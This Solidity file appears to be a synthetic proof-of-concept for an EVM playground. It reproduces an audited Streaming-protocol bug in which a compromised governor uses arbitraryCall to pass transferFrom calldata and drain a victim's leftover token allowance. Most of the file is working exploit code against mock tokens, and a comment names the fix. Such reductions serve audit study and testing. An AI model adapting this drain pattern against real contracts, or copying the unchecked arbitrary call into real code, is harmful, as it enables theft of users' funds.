// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Streaming Protocol — Improper arbitraryCall lets compromised gov steal
    (Code4rena 2021-11-streaming, finding #42395, H-04, reporter WatchPug et al.)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Locke.arbitraryCall is externallyGoverned and only requires
    incentives[who] == 0 (plus who != deposit/reward). After an incentive
    stream is fully claimed, incentives[incentiveToken] falls back to 0, so
    a compromised governor can call arbitraryCall(incentiveToken,
    transferFrom(victim, attacker, amount)) and drain any allowance the
    victim previously granted the stream (e.g. when creating the incentive).

    Harm: victim's remaining USDC (beyond the already-claimed incentive) is
    stolen via transferFrom through arbitraryCall.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "ALLOW");
        allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Locke — incentive + arbitraryCall.
contract Locke {
    address public streamCreator;
    address public depositToken;
    address public rewardToken;
    address public governor; // externallyGoverned
    mapping(address => uint256) public incentives; // token => remaining incentive amount

    bool private locked;

    modifier lock() {
        require(!locked, "LOCKED");
        locked = true;
        _;
        locked = false;
    }

    modifier externallyGoverned() {
        require(msg.sender == governor, "!gov");
        _;
    }

    constructor(address creator_, address gov_, address dep_, address rew_) {
        streamCreator = creator_;
        governor = gov_;
        depositToken = dep_;
        rewardToken = rew_;
    }

    /// @dev Alice creates an incentive: transfers amt of incentiveToken in.
    function createIncentive(address incentiveToken, uint256 amt) external {
        MockERC20(incentiveToken).transferFrom(msg.sender, address(this), amt);
        incentives[incentiveToken] += amt;
    }

    /// @dev After stream ends, creator claims the incentive back → incentives[token] = 0.
    function claimIncentive(address incentiveToken, address to) external {
        require(msg.sender == streamCreator, "!creator");
        uint256 amt = incentives[incentiveToken];
        require(amt > 0, "none");
        incentives[incentiveToken] = 0;
        MockERC20(incentiveToken).transfer(to, amt);
    }

    /**
     *  @dev Faithful reduction of Locke.arbitraryCall (Streaming/src/Locke.sol#L733).
     */
    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {
        // cannot have an active incentive for the callee
        // @> VULN: once the incentive is claimed, incentives[who]==0 even though
        // `who` is still a token users previously approved to this contract.
        // Compromised gov can pass transferFrom calldata and drain allowances.
        // FIX: track isIncentiveToken[token]=true forever and reject those callees.
        require(incentives[who] == 0, "inc");
        // cannot be to deposit token nor reward token
        require(who != depositToken && who != rewardToken, "erc");

        // get token balances
        uint256 preDepositTokenBalance = MockERC20(depositToken).balanceOf(address(this));
        uint256 preRewardTokenBalance = MockERC20(rewardToken).balanceOf(address(this));

        (bool success,) = who.call(data);
        require(success);

        // require no change in balances
        uint256 postDepositTokenBalance = MockERC20(depositToken).balanceOf(address(this));
        uint256 postRewardTokenBalance = MockERC20(rewardToken).balanceOf(address(this));
        require(
            preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, "erc"
        );
    }
}

/// @dev Alice — creates incentive and leaves residual USDC + allowance.
contract Alice {
    MockERC20 public usdc;
    Locke public stream;

    constructor(MockERC20 usdc_, Locke stream_) {
        usdc = usdc_;
        stream = stream_;
    }

    function fundAndCreateIncentive(uint256 incentiveAmt) external {
        usdc.approve(address(stream), type(uint256).max);
        stream.createIncentive(address(usdc), incentiveAmt);
    }
}

contract Exploit {
    MockERC20 public depositTok; // CREATE nonce 1
    MockERC20 public rewardTok; // CREATE nonce 2
    MockERC20 public usdc; // CREATE nonce 3 — incentive token (≠ deposit/reward)
    Locke public stream; // CREATE nonce 4
    Alice public alice; // CREATE nonce 5

    address public constant ATTACKER = address(0xBEEF);
    uint256 public constant INCENTIVE = 1000e6;
    uint256 public constant ALICE_REMAINING = 5000e6; // left in Alice's wallet after incentive

    constructor() {
        depositTok = new MockERC20("DEP", "DEP");
        rewardTok = new MockERC20("RWD", "RWD");
        usdc = new MockERC20("USDC", "USDC");
        // Exploit is both stream creator and compromised governor.
        stream = new Locke(address(this), address(this), address(depositTok), address(rewardTok));
        alice = new Alice(usdc, stream);

        // Alice holds incentive + remaining balance; unlimited approve for createIncentive.
        usdc.mint(address(alice), INCENTIVE + ALICE_REMAINING);
        alice.fundAndCreateIncentive(INCENTIVE);

        // Stream ends; creator claims the incentive → incentives[USDC] = 0.
        stream.claimIncentive(address(usdc), address(this));
        require(stream.incentives(address(usdc)) == 0, "incentive not cleared");
        require(usdc.balanceOf(address(alice)) == ALICE_REMAINING, "alice residual");
        // Alice's max approval to the stream is STILL active for the residual.
    }

    function run() external {
        uint256 attackerBefore = usdc.balanceOf(ATTACKER);

        // Compromised gov: arbitraryCall(USDC, transferFrom(alice, attacker, remaining)).
        bytes memory data = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", address(alice), ATTACKER, ALICE_REMAINING
        );
        stream.arbitraryCall(address(usdc), data);

        // HARM: Alice's remaining wallet balance stolen via leftover allowance.
        require(usdc.balanceOf(ATTACKER) == attackerBefore + ALICE_REMAINING, "not stolen");
        require(usdc.balanceOf(address(alice)) == 0, "alice drained");
    }
}
